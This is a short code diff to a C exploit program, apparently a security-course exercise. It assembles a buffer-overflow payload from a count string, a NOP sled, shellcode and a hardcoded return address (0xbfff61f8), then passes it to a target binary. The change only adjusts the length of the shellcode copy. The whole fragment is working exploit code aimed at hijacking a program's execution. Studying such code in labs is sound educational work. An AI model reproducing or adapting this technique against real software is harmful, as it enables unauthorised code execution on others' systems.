@@ -21,7 +21,7 @@ int main(void)
 
   strncpy(payload, count, strlen(count));
   memset(payload + strlen(count), 0x90, sizeof(payload) - strlen(count));
-  memcpy(payload + sizeof(payload) - sizeof(struct widget_t) - sizeof(shellcode), shellcode, sizeof(shellcode));
+  memcpy(payload + sizeof(payload) - sizeof(struct widget_t) - sizeof(shellcode), shellcode, sizeof(shellcode) - 1);
   *(int *)(payload + sizeof(payload) - sizeof(struct widget_t) + 4) = 0xbfff61f8;
 
   args[0] = TARGET; args[1] = payload; args[2] = NULL;
